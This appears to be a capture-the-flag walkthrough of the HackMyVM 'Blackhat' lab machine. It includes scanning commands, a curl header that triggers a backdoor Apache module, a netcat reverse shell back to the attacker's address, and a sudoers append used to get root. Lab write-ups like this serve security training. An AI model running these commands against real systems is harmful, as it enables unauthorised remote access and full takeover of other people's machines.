🧩 Blackhat Machine Walkthrough – HackMyVM
Difficulty: Easy
Goal: Gain initial access, escalate to user darkdante, and finally to root.
Target IP: 192.168.1.136

🔍 Initial Enumeration
Perform a full TCP port scan:

sudo nmap -p- --min-rate 5000 -n -Pn 192.168.1.136 -oG allPorts
Discovered open port:

80/tcp – Apache 2.4.54

Then, service and version detection with default scripts:

nmap -sCV -p80 192.168.1.136 -oN nmapblackhat.txt
🌐 Web Analysis
Directory brute-forcing using Gobuster:

gobuster dir -u http://192.168.1.136 -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -x php,html,txt,jpg -r
Found paths:

/index.html

/image.jpg

/phpinfo.php

Upon inspecting phpinfo.php, a suspicious module named mod_backdoor is discovered.

💥 Remote Code Execution (RCE)
Test remote code execution via HTTP header injection:

curl -H "Backdoor: id" http://192.168.1.136
Success: the command runs as www-data.

🐚 Reverse Shell
Gain remote shell access using netcat.

On the attacking machine:

nc -lvnp 9999
From the target:

curl -H "Backdoor: nc 192.168.1.10 9999 -e /bin/bash" http://192.168.1.136
Shell is established as user www-data.

🔑 Privilege Escalation to User
Check if the user darkdante has no password:

su darkdante
Access granted. The user flag is found in their home directory.

⚡ Privilege Escalation to Root
Check file permissions of /etc/sudoers:

getfacl /etc/sudoers
The user darkdante has write permissions. Add sudo privileges:

echo "darkdante ALL=(ALL:ALL) ALL" >> /etc/sudoers
Privilege escalation:

sudo su
Access gained as root. The final root flag is found at /root/root.txt.

🎯 Conclusion
The Blackhat machine is vulnerable due to:

An exposed malicious Apache module (mod_backdoor).

A user account without a password.

Insecure permissions on a critical system file (/etc/sudoers).

By exploiting these issues, full compromise of the machine is achieved.
